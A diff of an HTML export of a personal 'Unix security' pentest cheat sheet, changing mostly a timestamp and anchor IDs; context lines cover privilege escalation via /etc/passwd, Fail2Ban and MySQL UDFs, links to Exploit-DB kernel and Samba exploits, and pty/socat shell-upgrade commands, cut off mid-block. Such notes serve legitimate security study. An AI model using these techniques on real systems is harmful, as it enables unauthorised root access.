@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2025-05-26 Mon 22:16 -->
+<!-- 2025-06-06 Fri 00:01 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Unix security</title>
@@ -31,15 +31,15 @@
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
 <li><a href="#enum">Enumeration</a></li>
-<li><a href="#orga84c5f8">Exploits</a></li>
+<li><a href="#org247a149">Exploits</a></li>
 <li><a href="#priv-esc">Privilege escalation</a>
 <ul>
-<li><a href="#org90f53eb">Guides and references</a></li>
-<li><a href="#org8f379a6">General-purpose tools</a></li>
-<li><a href="#org1472bfe">Adding user to /etc/passwd</a></li>
-<li><a href="#org7aae380">Fail2Ban</a></li>
-<li><a href="#org2eeabc0">MySQL</a></li>
-<li><a href="#org6a39d14">Kernel exploits</a></li>
+<li><a href="#orgec78a54">Guides and references</a></li>
+<li><a href="#org9a3bdb4">General-purpose tools</a></li>
+<li><a href="#orge10b944">Adding user to /etc/passwd</a></li>
+<li><a href="#orgfb13f9f">Fail2Ban</a></li>
+<li><a href="#org55da62b">MySQL</a></li>
+<li><a href="#orgf612d1c">Kernel exploits</a></li>
 </ul>
 </li>
 <li><a href="#misc">Misc</a>
@@ -100,9 +100,9 @@ $ ss -tulpn 2&gt;/dev/null | grep LISTEN
 </ul>
 </div>
 </div>
-<div id="outline-container-orga84c5f8" class="outline-2">
-<h2 id="orga84c5f8">Exploits</h2>
-<div class="outline-text-2" id="text-orga84c5f8">
+<div id="outline-container-org247a149" class="outline-2">
+<h2 id="org247a149">Exploits</h2>
+<div class="outline-text-2" id="text-org247a149">
 <ul class="org-ul">
 <li><a href="https://www.exploit-db.com/exploits/10">Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution</a></li>
 </ul>
@@ -112,22 +112,22 @@ $ ss -tulpn 2&gt;/dev/null | grep LISTEN
 <h2 id="priv-esc">Privilege escalation</h2>
 <div class="outline-text-2" id="text-priv-esc">
 </div>
-<div id="outline-container-org90f53eb" class="outline-3">
-<h3 id="org90f53eb">Guides and references</h3>
-<div class="outline-text-3" id="text-org90f53eb">
+<div id="outline-container-orgec78a54" class="outline-3">
+<h3 id="orgec78a54">Guides and references</h3>
+<div class="outline-text-3" id="text-orgec78a54">
 <ul class="org-ul">
 <li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation">Basic Linux Privilege Escalation</a>: guide by g0tm1lk.</li>
 <li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html">Guide for OSCP</a>: by sushant747.</li>
 </ul>
 </div>
 </div>
-<div id="outline-container-org8f379a6" class="outline-3">
-<h3 id="org8f379a6">General-purpose tools</h3>
+<div id="outline-container-org9a3bdb4" class="outline-3">
+<h3 id="org9a3bdb4">General-purpose tools</h3>
 </div>
 
-<div id="outline-container-org1472bfe" class="outline-3">
-<h3 id="org1472bfe">Adding user to /etc/passwd</h3>
-<div class="outline-text-3" id="text-org1472bfe">
+<div id="outline-container-orge10b944" class="outline-3">
+<h3 id="orge10b944">Adding user to /etc/passwd</h3>
+<div class="outline-text-3" id="text-orge10b944">
 <p>
 This adds a user with <b>root</b> privileges to the <b>/etc/passwd</b> file:
 </p>
@@ -138,13 +138,13 @@ This adds a user with <b>root</b> privileges to the <b>/etc/passwd</b> file:
 </div>
 </div>
 </div>
-<div id="outline-container-org7aae380" class="outline-3">
-<h3 id="org7aae380">Fail2Ban</h3>
-<div class="outline-text-3" id="text-org7aae380">
+<div id="outline-container-orgfb13f9f" class="outline-3">
+<h3 id="orgfb13f9f">Fail2Ban</h3>
+<div class="outline-text-3" id="text-orgfb13f9f">
 </div>
-<div id="outline-container-org6ccb530" class="outline-4">
-<h4 id="org6ccb530">Weak permissions</h4>
-<div class="outline-text-4" id="text-org6ccb530">
+<div id="outline-container-org4ca6b5c" class="outline-4">
+<h4 id="org4ca6b5c">Weak permissions</h4>
+<div class="outline-text-4" id="text-org4ca6b5c">
 <p>
 If the current user has write permissions on the <b><i>etc/fail2ban</i></b> configuration,
 privilege escalation can be achieved. One of the possible way is described <a href="https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7">here</a>,
@@ -159,17 +159,17 @@ configuration is loaded.
 </p>
 </div>
 </div>
-<div id="outline-container-org2f8f270" class="outline-4">
-<h4 id="org2f8f270">Whois manipulation</h4>
+<div id="outline-container-orgfca928b" class="outline-4">
+<h4 id="orgfca928b">Whois manipulation</h4>
 </div>
 </div>
-<div id="outline-container-org2eeabc0" class="outline-3">
-<h3 id="org2eeabc0">MySQL</h3>
-<div class="outline-text-3" id="text-org2eeabc0">
+<div id="outline-container-org55da62b" class="outline-3">
+<h3 id="org55da62b">MySQL</h3>
+<div class="outline-text-3" id="text-org55da62b">
 </div>
-<div id="outline-container-orgcf71227" class="outline-4">
-<h4 id="orgcf71227">User-Defined Functions (UDF)</h4>
-<div class="outline-text-4" id="text-orgcf71227">
+<div id="outline-container-orgd735696" class="outline-4">
+<h4 id="orgd735696">User-Defined Functions (UDF)</h4>
+<div class="outline-text-4" id="text-orgd735696">
 <p>
 Privilege escalation can be achieve through UDFs (User-Defined Function)
 as described by <a href="https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf">r3d-buck3t</a> and <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation">hacktricks</a>. Simply compile the <a href="https://www.exploit-db.com/exploits/1518">exploit</a> by
@@ -189,9 +189,9 @@ MariaDB [mysql]&gt; use mysql; create table foo(line blob); insert into foo valu
 </div>
 </div>
 </div>
-<div id="outline-container-org6a39d14" class="outline-3">
-<h3 id="org6a39d14">Kernel exploits</h3>
-<div class="outline-text-3" id="text-org6a39d14">
+<div id="outline-container-orgf612d1c" class="outline-3">
+<h3 id="orgf612d1c">Kernel exploits</h3>
+<div class="outline-text-3" id="text-orgf612d1c">
 <ul class="org-ul">
 <li><a href="https://www.exploit-db.com/exploits/18411">Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper'
 Local Privilege Escalation (1)</a></li>
@@ -215,18 +215,18 @@ Credit goes to:
 <li><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">ROPNOP's blog</a></li>
 </ul>
 </div>
-<div id="outline-container-orga348fc8" class="outline-4">
-<h4 id="orga348fc8">Python</h4>
-<div class="outline-text-4" id="text-orga348fc8">
+<div id="outline-container-orgfcb0c68" class="outline-4">
+<h4 id="orgfcb0c68">Python</h4>
+<div class="outline-text-4" id="text-orgfcb0c68">
 <div class="org-src-container">
 <pre class="src src-shell">$ python -c <span class="org-string">'import pty; pty.spawn("/bin/bash")'</span>
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-org053239d" class="outline-4">
-<h4 id="org053239d">Socat</h4>
-<div class="outline-text-4" id="text-org053239d">
+<div id="outline-container-org6ab3666" class="outline-4">
+<h4 id="org6ab3666">Socat</h4>
+<div class="outline-text-4" id="text-org6ab3666">
 <div class="org-src-container">
 <pre class="src src-shell"><span class="org-comment-delimiter"># </span><span class="org-comment">On client</span>
 $ socat file:<span class="org-sh-quoted-exec">`tty`</span>,raw,<span class="org-variable-name">echo</span>=0 tcp-listen:1234
